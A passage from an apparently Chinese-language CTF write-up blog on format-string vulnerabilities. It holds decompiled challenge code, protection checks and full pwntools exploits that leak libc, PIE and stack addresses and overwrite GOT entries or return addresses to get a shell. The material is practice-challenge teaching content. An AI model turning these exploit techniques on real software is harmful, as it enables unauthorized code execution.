class="hljs-number">68</span> <span class="hljs-number">68</span>  │%<span class="hljs-number">8</span>$h│hn%<span class="hljs-number">1</span>│<span class="hljs-number">28</span>c%│<span class="hljs-number">9</span>$hh│    <span class="hljs-number">00000030</span>  <span class="hljs-number">6</span>e <span class="hljs-number">25</span> <span class="hljs-number">34</span> <span class="hljs-number">63</span>  <span class="hljs-number">25</span> <span class="hljs-number">31</span> <span class="hljs-number">30</span> <span class="hljs-number">24</span>  <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">6</span>e <span class="hljs-number">0</span>a               │n%<span class="hljs-number">4</span>c│%<span class="hljs-number">10</span>$│hhn·││    <span class="hljs-number">0000003</span>c</code></pre></div><p>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。</p><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+2Ch] [ebp-5Ch]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+7Ch] [ebp-Ch]</span>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);  be_nice_to_people();  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>u);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x50</span>u);  <span class="hljs-built_in">printf</span>(&amp;buf);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d!\n"</span>, *(_DWORD *)&amp;x);  <span class="hljs-keyword">if</span> ( *(_DWORD *)&amp;x != <span class="hljs-number">4</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"running sh..."</span>);  system(<span class="hljs-string">"/bin/sh"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>十分简单的题目，检验 x 值是否为4，如果是4（数字），就直接给你shell了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span><span class="hljs-comment"># io = process('./fm')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26915</span>)<span class="hljs-comment"># io.recv()</span>payload = p32(<span class="hljs-number">0x0804A02C</span>) + <span class="hljs-string">'%11$hn'</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, _IONBF, <span class="hljs-number">0</span>);alarm(<span class="hljs-number">180</span>);<span class="hljs-keyword">char</span> str[<span class="hljs-number">100</span>];<span class="hljs-keyword">while</span>(gets(str)) &#123;<span class="hljs-built_in">printf</span>(str);&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>需要编译为64位，这个题比起来第一个也就是没有了system函数，需要自己泄漏一下libc的base，算出system地址，然后还是GOT hijack就可以了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.arch = <span class="hljs-string">'amd64'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./fmt1'</span>)elf = ELF(<span class="hljs-string">'./fmt1'</span>)libc = elf.libcprintf_got = <span class="hljs-number">0x0000601020</span>io.sendline(<span class="hljs-string">'%21$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)libc_base = int((io.recv(<span class="hljs-number">12</span>)),<span class="hljs-number">16</span>) - <span class="hljs-number">240</span> -libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]print(<span class="hljs-string">'leak_libc_base: '</span> + hex(libc_base))print(<span class="hljs-string">'system_addr: '</span> + hex(system_addr))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key = system_addr<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">12</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">'a'</span>) + p64(printf_got) +p64(printf_got+<span class="hljs-number">2</span>) + p64(printf_got+<span class="hljs-number">4</span>)io.sendline(payload)sleep(<span class="hljs-number">1</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-keyword">int</span> magic = <span class="hljs-number">0</span> ;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"Please crax me !"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give me magic :"</span>);read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(buf);<span class="hljs-keyword">if</span>(magic == <span class="hljs-number">0xda</span>)&#123;system(<span class="hljs-string">"cat /home/craxme/flag"</span>);&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(magic == <span class="hljs-number">0xfaceb00c</span>)&#123;system(<span class="hljs-string">"cat /home/craxme/craxflag"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">puts</span>(<span class="hljs-string">"You need be a phd"</span>);&#125;&#125;</code></pre></div><p>编译为64位。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>（这个题目是纯粹就是为了练习任意地址写入的，我这里就直接写exp拿sheel了。）可以看到当再一次printf，之后程序便停止了，且结束前有puts函数。<br>思路就是可以GOT hijack put函数的GOT为read函数哪里，让其call puts函数时返回到read函数，并且在这次printf函数漏洞利用时，也把printf函数的GOT改为system的plt，然后传入<code>/bin/sh</code>即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./craxme'</span>)<span class="hljs-comment"># io = remote('127.0.0.1',8888)</span>magic = <span class="hljs-number">0x0000060106C</span>io.recvuntil(<span class="hljs-string">':'</span>)system_plt = <span class="hljs-number">0x04005A0</span>puts_got = <span class="hljs-number">0x0601018</span>ret_addr = <span class="hljs-number">0x00400747</span>printf_got = <span class="hljs-number">0x00601030</span>key = <span class="hljs-number">0x00400747</span>key2 = <span class="hljs-number">0x04005A0</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">26</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    payload +=fmt_short(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">29</span>+i)     prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x80</span>+<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) + flat([puts_got,puts_got+<span class="hljs-number">2</span>,puts_got+<span class="hljs-number">4</span>,printf_got,printf_got+<span class="hljs-number">2</span>,printf_got+<span class="hljs-number">4</span>])io.sendline(payload)io.interactive()</code></pre></div><h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3'</span>    Arch:     i386<span class="hljs-number">-32</span>-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x8048000</span>)</code></pre></div><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题模拟了一个ftp服务。<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>这里控制的是登陆。进入分析一下：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *__<span class="hljs-function">cdecl <span class="hljs-title">ask_username</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *dest)</span></span>&#123;  <span class="hljs-keyword">char</span> src[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+14h] [ebp-34h]</span>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+3Ch] [ebp-Ch]</span>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Connected to ftp.hacker.server"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"220 Serv-U FTP Server v6.4 for WinSock ready..."</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name (ftp.hacker.server:Rainism):"</span>);  __isoc99_scanf(<span class="hljs-string">"%40s"</span>, src);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">39</span> &amp;&amp; src[i]; ++i )    ++src[i];  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcpy</span>(dest, src);&#125;</code></pre></div><p>用户名函数，发现对你输入的东西进行诸位的进行加一。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">ask_password</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s1)</span></span>&#123;  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">"sysbdmin"</span>) )    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"welcome!"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"who you are?"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"welcome!"</span>);&#125;</code></pre></div><p>用户密码函数，发现要跟<code>sysbdmin</code> 进行对比，如果不相等，就直接退出。<br>(strcmp函数对比两个字符串时，相等返回0，!0 = 非假 = 真）<br>所以这个绕过就时sysbdmin 诸位减1即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>剩下的就是输入<code>get put dir</code>,会进入不同的分支，其中输入get函数：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_file</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> dest; <span class="hljs-comment">// [esp+1Ch] [ebp-FCh]</span>  <span class="hljs-keyword">char</span> s1; <span class="hljs-comment">// [esp+E4h] [ebp-34h]</span>  <span class="hljs-keyword">char</span> *i; <span class="hljs-comment">// [esp+10Ch] [ebp-Ch]</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"enter the file name you want to get:"</span>);  __isoc99_scanf(<span class="hljs-string">"%40s"</span>, &amp;s1);  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(&amp;s1, <span class="hljs-string">"flag"</span>, <span class="hljs-number">4u</span>) )    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"too young, too simple"</span>);  <span class="hljs-keyword">for</span> ( i = (<span class="hljs-keyword">char</span> *)file_head; i; i = (<span class="hljs-keyword">char</span> *)*((_DWORD *)i + <span class="hljs-number">60</span>) )  &#123;    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(i, &amp;s1) )    &#123;      <span class="hljs-built_in">strcpy</span>(&amp;dest, i + <span class="hljs-number">40</span>);      <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;dest);    &#125;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;dest);&#125;</code></pre></div><p>这个函数是有格式化字符串漏洞的，当你put上去一个文件，它会让你输入文件名字和文件内容，然后get这个函数会根据文件名字，来输出其内容，利用这两个函数搭配一下就可以实现格式化字符串漏洞的利用了。并且在dir中，其会输出一个文件的名字，用的是puts函数。然后就有思路利用了：</p><ul><li>由于没有system函数，然后就需要想办法泄漏一下libc地址，来算出system的函数在libc的地址。</li><li>修改puts函数的got为system的地址，然后记得这个文件的名称是<code>/bin/sh</code>,这样在使用dir调用puts函数时，就可以拿到shell了。<br>这题比较有趣，有点难在分析这个程序在干嘛，利用思路倒是不难。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./pwn3'</span>)elf = ELF(<span class="hljs-string">'./pwn3'</span>)libc = elf.libcs = <span class="hljs-string">'sysbdmin'</span>key = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:    key+=chr(ord(i)<span class="hljs-number">-1</span>)print(key)io.sendline(key)info(<span class="hljs-string">'---------leak libc_base--------'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'put'</span>)io.recvuntil(<span class="hljs-string">'upload:'</span>)io.sendline(<span class="hljs-string">'1111'</span>)puts_got = elf.got[<span class="hljs-string">'puts'</span>]io.sendline(<span class="hljs-string">'%8$s'</span> + p32(puts_got) )io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'get'</span>)io.recvuntil(<span class="hljs-string">'get:'</span>)io.sendline(<span class="hljs-string">'1111'</span>)puts_addr = u32(io.recv(<span class="hljs-number">4</span>)[:<span class="hljs-number">4</span>])print(<span class="hljs-string">'puts_add:'</span> + hex(puts_addr))sys_addr = puts_addr - libc.symbols[<span class="hljs-string">'puts'</span>] + libc.symbols[<span class="hljs-string">'system'</span>]io.recvuntil(<span class="hljs-string">'&gt;'</span>)info(<span class="hljs-string">'---------hijack puts_got--------'</span>)io.sendline(<span class="hljs-string">'put'</span>)io.recvuntil(<span class="hljs-string">'upload:'</span>)io.sendline(<span class="hljs-string">'/bin/sh;'</span>)payload = fmtstr_payload(<span class="hljs-number">7</span>,&#123;puts_got: sys_addr&#125;)io.sendline(payload)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'get'</span>)io.recvuntil(<span class="hljs-string">'get:'</span>)info(<span class="hljs-string">'--------- get shell-------'</span>)io.sendline(<span class="hljs-string">'/bin/sh;'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'dir'</span>)io.interactive()</code></pre></div><h2 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h2><h3 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>开启了RELRO，这样就无法修改got了。</p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出。其中在展示用户信息当中，存在格式化字符串漏洞：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">sub_400B07</span><span class="hljs-params">(<span class="hljs-keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="hljs-keyword">char</span> formata, __int64 a8, __int64 a9)</span></span>&#123;  write(<span class="hljs-number">0</span>, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>, <span class="hljs-number">0x1A</span>uLL);  <span class="hljs-built_in">printf</span>(&amp;formata, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;a9 + <span class="hljs-number">4</span>);&#125;</code></pre></div><p>其中发现其输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>并且还发现其中有个后门函数，会调用system函数给你shell，就可以去修改程序的返回地址，直接返回到这里就拿到shell了。<br>Gdb调试定位关键在这个printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p><p>看一下此时的栈情况，输入的usename可以确定偏移是8，rdi也是指向了存放password的地址。并且发现栈上也有很多栈的地址信息，当第二次运行到这里的时候，这里esp对应的地址信息也是不会变的，所以就可以通过泄漏这里的值来算出ret address，然后修改用户信息，这下把ret address的point放到栈上，接着就开始修改ret address的值了。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./pwnme_k0'</span>)<span class="hljs-comment"># context.clear(arch = 'amd64')</span>io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(<span class="hljs-string">'%0006$lx'</span>)io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(<span class="hljs-string">'11111111'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)<span class="hljs-comment"># io.recvuntil('Welc0me to sangebaimao!\n')</span>stack = int(io.recvline_contains(<span class="hljs-string">'7f'</span>),<span class="hljs-number">16</span>)print(stack)ret_add = stack - <span class="hljs-number">0x38</span><span class="hljs-comment"># system_add = 0x04008AA</span>payload = <span class="hljs-string">'%2218c%8$hn'</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'2'</span>)io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(p64(ret_add))io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)io.interactive()</code></pre></div><h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/media/psf/mypwn2/buuctf/inndy_echo2/echo2'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre></div><p>可以看到开启了pie，这时候就需要来泄漏一下pie的基地址。</p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __<span class="hljs-function">noreturn <span class="hljs-title">echo</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+0h] [rbp-110h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+108h] [rbp-8h]</span>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">do</span>  &#123;    fgets(&amp;s, <span class="hljs-number">256</span>, <span class="hljs-built_in">stdin</span>);    <span class="hljs-built_in">printf</span>(&amp;s, <span class="hljs-number">256L</span>L);  &#125;  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(&amp;s, <span class="hljs-string">"exit\n"</span>) );  system(<span class="hljs-string">"echo Goodbye"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>代码是比较简单的，还是got hijack 就行了。难点也是如何来处理这个pie保护。</p><h3 id="gdb-调试"><a href="#gdb-调试" class="headerlink" title="gdb 调试"></a>gdb 调试</h3><div class="hljs"><pre><code class="hljs c">=&gt; <span class="hljs-number">0x555555554984</span> &lt;echo+<span class="hljs-number">68</span>&gt;:call   <span class="hljs-number">0x5555555547a0</span> &lt;<span class="hljs-built_in">printf</span>@plt&gt;   <span class="hljs-number">0x555555554989</span> &lt;echo+<span class="hljs-number">73</span>&gt;:lea    rax,[rbp<span class="hljs-number">-0x110</span>]   <span class="hljs-number">0x555555554990</span> &lt;echo+<span class="hljs-number">80</span>&gt;:lea    rsi,[rip+<span class="hljs-number">0xfd</span>]        # <span class="hljs-number">0x555555554a94</span>   <span class="hljs-number">0x555555554997</span> &lt;echo+<span class="hljs-number">87</span>&gt;:mov    rdi,rax   <span class="hljs-number">0x55555555499a</span> &lt;echo+<span class="hljs-number">90</span>&gt;:call   <span class="hljs-number">0x5555555547d0</span> &lt;<span class="hljs-built_in">strcmp</span>@plt&gt;</code></pre></div><p>找到关键点，然后看一下栈情况：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-number">0192</span>| <span class="hljs-number">0x7fffffffe1c0</span> --&gt; <span class="hljs-number">0x7ffff7dd2620</span> --&gt; <span class="hljs-number">0xfbad2087</span>--More--(<span class="hljs-number">25</span>/<span class="hljs-number">48</span>)<span class="hljs-number">0200</span>| <span class="hljs-number">0x7fffffffe1c8</span> --&gt; <span class="hljs-number">0x7ffff7a88947</span> (&lt;_IO_default_setbuf+<span class="hljs-number">23</span>&gt;:cmp    eax,<span class="hljs-number">0xffffffff</span>)<span class="hljs-number">0208</span>| <span class="hljs-number">0x7fffffffe1d0</span> --&gt; <span class="hljs-number">0x7ffff7dd2620</span> --&gt; <span class="hljs-number">0xfbad2087</span><span class="hljs-number">0216</span>| <span class="hljs-number">0x7fffffffe1d8</span> --&gt; <span class="hljs-number">0x7ffff7fd8700</span> (<span class="hljs-number">0x00007ffff7fd8700</span>)<span class="hljs-number">0224</span>| <span class="hljs-number">0x7fffffffe1e0</span> --&gt; <span class="hljs-number">0x555555554810</span> (&lt;_start&gt;:xor    ebp,ebp)<span class="hljs-number">0232</span>| <span class="hljs-number">0x7fffffffe1e8</span> --&gt; <span class="hljs-number">0x7ffff7a85439</span> (&lt;_IO_new_file_setbuf+<span class="hljs-number">9</span>&gt;:test   rax,rax)<span class="hljs-number">0240</span>| <span class="hljs-number">0x7fffffffe1f0</span> --&gt; <span class="hljs-number">0x7ffff7dd2620</span> --&gt; <span class="hljs-number">0xfbad2087</span></code></pre></div><p>发现在<code>0x7fffffffe1e0</code>这里就可以泄漏出pie基址了，确定偏移是34。然后剩下的就简单了，直接ida里面查看下plt和got ，加上以后就得到了真正的<br>plt和got地址。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *context.log_level = 'debug'context.arch = 'amd64'io = process('./echo2')# io = remote('node3.buuoj.cn',28200)def leak1():    io.sendline('%34$p')    io.recvuntil('0x')    p_bass_addr = int((io.recv(9)+'000'),16)    return p_bass_addrp_bass_addr = leak1()print('p_bass_addr -&gt;' + hex(p_bass_addr))print_got = 0x201020 + p_bass_addrprint('print_got -&gt;' + hex(print_got))system_plt = 0x790 + p_bass_addrprint('system_plt -&gt;' + hex(system_plt))def fmt(prev,val,idx,byte = 2):    result = ""    if prev &lt; val :        result += "%" + str(val - prev) + "c"    elif prev == val :        result += ''    else :        result += "%" + str(256**byte - prev + val) + "c"    result += "%" + str(idx) + "$hn"    return resultprev = 0 payload = ""key = system_pltfor i in range(3):    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x40,'a') + flat([print_got,print_got+2,print_got+4])# raw_input('-&gt;')io.sendline(payload)sleep(0.1)io.sendline('/bin/sh\x00')io.interactive()</code></pre></div><p>-—  </p><p>** 接下来的题，都是buf不再栈的上的题目。**</p><h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs c">[*] '/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre></div><p>可以看到nx保护是关闭的，可以想办法利用shellcode。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    result = (<span class="hljs-keyword">int</span>)fgets(buf, <span class="hljs-number">1024</span>, <span class="hljs-built_in">stdin</span>);    <span class="hljs-keyword">if</span> ( !result )      <span class="hljs-keyword">break</span>;    echo();  &#125;  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>漏洞函数：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span 